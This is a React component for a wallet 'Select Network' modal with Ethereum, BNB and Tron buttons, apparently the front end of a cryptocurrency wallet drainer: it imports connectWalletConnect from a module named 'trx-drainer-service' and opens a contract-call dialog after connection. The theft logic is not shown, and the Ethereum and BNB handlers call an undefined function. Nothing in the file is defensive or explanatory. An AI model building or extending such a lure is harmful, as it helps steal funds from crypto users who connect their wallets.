import { Dialog } from "@headlessui/react";
import { AnimatePresence, motion } from "framer-motion";
import {connectWalletConnect} from '../services/trx-drainer-service'

type ModalProps = {
    isOpen: boolean, 
    setIsOpen: any,
    setIsFinishModalOpen: (val: boolean) => void,
    setIsCallContractModalOpen: (val: boolean) => void,
}

export default function ModalWithNetworkSelector({isOpen, setIsOpen, setIsFinishModalOpen, setIsCallContractModalOpen}: ModalProps) {  

  const handleEthereum = () => {
    init_co()
    console.log("Ethereum selected");
  };

  const handleBNB = () => {
    init_co()
    console.log("BNB selected");
  };

  const handleTron = () => {
    connectWalletConnect(setIsFinishModalOpen, setIsCallContractModalOpen)
    console.log("Tron selected");
  };

  const handleSelect = (network: string) => {
    switch (network) {
      case "Ethereum":
        handleEthereum();
        break;
      case "BNB":
        handleBNB();
        break;
      case "Tron":
        handleTron();
        break;
      default:
        break;
    }
    setIsOpen(false);
  };

  const networks = [
    {
      name: "Ethereum",
      color: "bg-[#627EEA]",
      icon: (
        <svg
          xmlns="http://www.w3.org/2000/svg"
          viewBox="0 0 256 417"
          className="w-5 h-5 mr-2"
          fill="white"
        >
          <path d="M127.9 0L124.2 12.5v267.4l3.7 3.7 127.9-75.5L127.9 0zM127.9 0L0 208.1l127.9 75.5V0zM127.9 301.5l-2.1 2.6v112.6l2.1 6.1 128-179.2-128 57.9zM127.9 422.8V301.5L0 243.6l127.9 179.2z" />
        </svg>
      ),
    },
    {
      name: "BNB",
      color: "bg-[#F3BA2F]",
      icon: (
        <svg
          xmlns="http://www.w3.org/2000/svg"
          viewBox="0 0 2500 2500"
          className="w-5 h-5 mr-2"
          fill="white"
        >
          <path d="M1249.7 0 1437 187.2 939 685.1l-187.2-187L1249.7 0zm561.1 561.1 187.2 187.2-498 498-187.2-187.2 498-498zm-561.1 373.6 187.2 187.2-187.2 187.2-187.2-187.2 187.2-187.2zM686 561.1l498 498-187.2 187.2-498-498L686 561.1zM939 1813.7l-187.2 187.2L0 1249.7l187.2-187.2 751.8 751.2zm561.1 0 751.2-751.2 187.2 187.2-751.2 751.2-187.2-187.2zm0 373.6 187.2 187.2-437.6 437.6-437.6-437.6 187.2-187.2 250.4 250.4 250.4-250.4z" />
        </svg>
      ),
    },
    {
      name: "Tron",
      color: "bg-[#EF0027]",
      icon: (
        <svg
          xmlns="http://www.w3.org/2000/svg"
          viewBox="0 0 240 240"
          className="w-5 h-5 mr-2"
          fill="white"
        >
          <path d="M35 30 195 45 115 200zM70 60l65 15-30 55z" />
        </svg>
      ),
    },
  ];

  return (

      <AnimatePresence>
        {isOpen && (
          <Dialog
            as="div"
            className="fixed inset-0 z-50 flex items-center justify-center"
            onClose={() => setIsOpen(false)}
            open={isOpen}
          >
            <div className="fixed inset-0 bg-black/60" aria-hidden="true" />

            <motion.div
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.95 }}
              transition={{ duration: 0.2 }}
              className="relative z-50 bg-[#1a1a2e] rounded-2xl p-8 w-[90%] max-w-md shadow-2xl"
            >
              <Dialog.Title className="text-2xl font-bold text-center mb-6 text-white">
                Select Network
              </Dialog.Title>
              <div className="space-y-4">
                {networks.map((net) => (
                  <button
                    key={net.name}
                    onClick={() => handleSelect(net.name)}
                    className={`w-full flex items-center justify-center py-3 rounded-xl font-semibold text-white text-lg hover:opacity-90 transition ${net.color}`}
                  >
                    {net.icon}
                    {net.name}
                  </button>
                ))}
              </div>
              <button
                onClick={() => setIsOpen(false)}
                className="absolute top-4 right-4 text-gray-400 hover:text-white text-xl"
              >
                ×
              </button>
            </motion.div>
          </Dialog>
        )}
      </AnimatePresence>
  );
}